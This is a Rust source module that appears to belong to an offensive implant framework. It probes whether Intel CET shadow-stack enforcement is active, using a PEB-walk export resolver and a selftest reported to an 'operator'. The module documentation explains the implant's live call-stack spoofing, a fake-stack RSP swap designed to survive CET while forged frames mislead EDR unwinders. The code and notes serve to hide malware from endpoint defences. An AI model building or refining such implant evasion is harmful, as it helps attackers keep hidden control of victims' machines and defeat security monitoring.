//! Caller-spoof CET posture — shadow-stack probe + CET-safety contract.
//!
//! # Status
//! The old return-address spoofing machinery (`ReturnStub` scanner,
//! `call_with_spoofed_return` / `call_with_spoofed_return!`, `call_plain`) was
//! removed — it was dead code with no production call site, and its ABI
//! premise was wrong (the Win64 convention requires the CALL **site** RSP to
//! be 16-aligned; the old implementation delivered the target with a
//! 16-aligned entry RSP). Its CET story was also wrong-headed: that design
//! RETURNED THROUGH a forged frame (`ret` pops the forged address → mismatch
//! with the shadow stack → #CP), which is the one spoof shape CET genuinely
//! kills.
//!
//! The live spoof is the gap-sea RSP swap in [`nyx_implant_core::stack`]
//! (`with_spoofed_stack` / `spoof_wrap`, armed at bootstrap via
//! `evasionsdk::swap::decide`). It is **CET-shadow-stack-safe by
//! construction**: the fake stack is entered with a normal `call`, so every
//! executed `ret` pops a value a real `call` just pushed (matched data +
//! shadow pair), and the forged leaf-gap chain above the call region is only
//! READ by EDR unwinders, never POPPED. There is therefore NO CET
//! degradation on the spoof path — `swap::decide` gates only on gap
//! usability, and the spoof stays active on CET-on hosts. (Windows enforces
//! CET's other half, IBT, only in kernel mode, so the trampoline's indirect
//! calls need no `endbr64`.)
//!
//! What remains here is the **CET probe** (`[`is_cet_enabled`]`), which is
//! live: `nyx_selftest_cet_status` reports it as an operator diagnostic, and
//! the loader's host-side probe (`nyx-loader/src/dll_probe.rs`) mirrors the
//! same `IsProcessorFeaturePresent(PF_RETURN_CONTROL_ENFORCE)` query so the
//! two agree. The probe now answers "is shadow-stack enforcement active
//! while the (CET-safe) spoof runs" — useful posture information (a
//! kernel-level detector can compare data vs shadow stack there), not a
//! go/no-go gate.

#![cfg(target_os = "windows")]

/// Win64 feature constant for `IsProcessorFeaturePresent`: Intel CET shadow
/// stack (Hardware-enforced Stack Protection). Documented in winnt.h as
/// `PF_RETURN_CONTROL_ENFORCE` (value 41).
///
/// ## What the bit actually answers
/// Feature 41 reports **user-mode shadow stack** support/enforcement for the
/// CURRENT process: on Win11 22H2+ with CET-capable hardware (Intel 11th-gen+
/// / AMD Zen3+), a process that opted into HSP ( linker `/CETCOMPAT` or
/// `SetProcessMitigationPolicy` ) sees TRUE; every pre-CET OS (Win10, Server
/// 2019/2022) and every non-opted-in process sees FALSE. It does NOT cover:
///   - CET **IBT** (indirect-branch tracking / `endbr64` enforcement) — a
///     separate mitigation this probe cannot see; indirect `call rax`-style
///     jumps into non-ENDBR stubs are a distinct #CP class not gated here.
///   - **Kernel-side** CET / HVCI / PatchGuard posture — user-mode
///     `IsProcessorFeaturePresent` says nothing about the kernel.
/// So `false` means "user-mode shadow-stack #CP on forged `ret`s is not a
/// hazard for THIS process", nothing more.
///
/// ## Cross-implementation consistency
/// `nyx_implant_core::version::cet_active()` (cached) and the loader probe
/// (`nyx-loader/src/dll_probe.rs`) query the SAME export with the SAME
/// constant 41, so all three agree per-process. Keep it that way: if this
/// constant or API ever changes, change all three together.
const PF_CET_SHADOW_STACK: u32 = 41;

/// Interpret the raw `IsProcessorFeaturePresent(PF_CET_SHADOW_STACK)` return
/// value: any non-zero means the feature is present. Extracted as a pure
/// function so the decision mapping is unit-testable without a live PEB-walk
/// resolver (wine64 has no CET — the tests pin the DECISION, not the bit).
fn probe_value_means_cet(raw: i32) -> bool {
    raw != 0
}

/// Probe whether this process runs under Intel CET hardware-enforced shadow
/// stack (HSP). Resolves `kernel32!IsProcessorFeaturePresent` via the PEB walk
/// and queries feature 41. Returns `false` on any resolution failure (fail
/// OPEN — assume CET is off, so a spoof path is still attempted; a #CP there
/// would be loud, but a missing kernel32 export is far more likely than a
/// silently-on CET).
///
/// # Safety
/// Must run after PEB-walk bootstrap.
pub unsafe fn is_cet_enabled() -> bool {
    // Prefer kernel32 (always exports IsProcessorFeaturePresent on >= NT 6.1).
    let addr =
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"IsProcessorFeaturePresent")
            .or_else(|| {
                nyx_implant_core::resolve::export_addr(
                    b"kernelbase.dll",
                    b"IsProcessorFeaturePresent",
                )
            });
    let Some(addr) = addr else {
        return false;
    };
    type FnIsPresent = unsafe extern "system" fn(u32) -> i32;
    let f: FnIsPresent = core::mem::transmute(addr);
    probe_value_means_cet(f(PF_CET_SHADOW_STACK))
}

/// Selftest: report CET shadow-stack status. The return-address spoof path
/// that would have consumed this flag was removed (it was dead code with a
/// wrong Win64 alignment premise — see the module docs); the probe itself is
/// kept as a runtime diagnostic so the operator knows whether a spoof path
/// would have degraded on this host.
///
/// Returns:
///   0 = CET not present
///   1 = CET present
///
/// Note `is_cet_enabled` fails OPEN (returns `false`) if it cannot resolve
/// `IsProcessorFeaturePresent` — that resolution failure is indistinguishable
/// from "CET genuinely off" here. On a PEB-walk-bootstrapped implant the
/// resolver is reliable, so this only matters in the degenerate
/// pre-bootstrap window.
pub fn selftest_cet_status() -> u8 {
    if unsafe { is_cet_enabled() } {
        1
    } else {
        0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The probe-value mapping: non-zero (including any negative garbage the
    /// API will never actually return) means CET present; exactly 0 means off.
    /// This is the part of `is_cet_enabled` that is unit-testable without a
    /// hardware CET bit — wine64 always reports 0 for feature 41.
    #[test]
    fn probe_value_means_cet_mapping() {
        assert!(!probe_value_means_cet(0));
        assert!(probe_value_means_cet(1));
        assert!(probe_value_means_cet(-1));
        assert!(probe_value_means_cet(i32::MAX));
    }

    /// Live-resolution smoke: the PEB-walk resolver + export call chain must
    /// not fault, and the selftest byte must agree with the raw probe. On
    /// wine64 feature 41 is always 0 → both report CET off; on a real
    /// CET-enabled host both would report on — either way they must agree.
    #[test]
    fn is_cet_enabled_and_selftest_agree() {
        let raw = unsafe { is_cet_enabled() };
        let reported = selftest_cet_status();
        assert_eq!(reported, if raw { 1 } else { 0 });
    }
}
